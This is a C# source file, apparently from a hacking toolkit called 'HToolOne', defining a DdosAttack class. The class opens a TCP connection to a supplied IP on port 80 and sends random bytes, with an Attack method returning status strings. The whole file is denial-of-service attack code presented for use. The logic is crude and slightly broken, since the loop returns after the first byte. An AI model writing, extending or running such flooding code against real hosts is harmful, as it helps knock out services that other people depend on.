using System;
using HToolOne.Global;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace HToolOne.Ddos
{
    internal  class DdosAttack
    {
        public byte[] MessageSent;
        private readonly Socket _socket;

        public DdosAttack(string ip)
        {
            IPAddress _ipAddr =  IPAddress.Parse(ip);
            var localEndPoint = new IPEndPoint(_ipAddr, 80);
            MessageSent = Explicit.GetRndByteArray();
            _socket = new Socket(_ipAddr.AddressFamily,
                SocketType.Stream, ProtocolType.Tcp);
            _socket.Connect(localEndPoint);
        }


        public Task<string> Attack()
        {
            return Task.Run(() =>
            {
                try
                {
                    _socket.Send(MessageSent);
                    foreach (var i in MessageSent)
                    {
                        return string.Format($"send {i} - {Convert.ToChar(i)}");
                    }
                }
                catch (SocketException)
                {
                    return "Remote Host closed the connection or an unexpected error occured";
                }

                return "***** Operation error *****";
            });
        }



    }
}
